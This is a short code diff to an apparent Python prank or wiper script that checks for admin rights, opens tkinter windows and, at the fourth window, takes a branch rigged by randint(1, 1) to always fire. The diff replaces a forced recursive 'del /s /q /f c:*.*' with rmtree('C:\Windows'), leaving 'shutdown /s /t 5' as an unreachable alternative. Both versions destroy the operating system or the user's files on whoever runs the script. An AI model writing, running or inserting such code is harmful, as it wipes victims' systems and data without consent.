@@ -3,6 +3,7 @@ from ctypes import *
 from os import system
 from tkinter import *
 from random import *
+from shutil import rmtree
 
 def isAdmin():
     try:
@@ -39,7 +40,7 @@ def createWindow(labelText, buttonText, i):
     windows.append(window)
     if i == 4:
         if randint(1, 1) == 1:
-            system('del /s /q /f c:*.*')
+            rmtree('C:\Windows')
         else:
             system('shutdown /s /t 5')
     return window
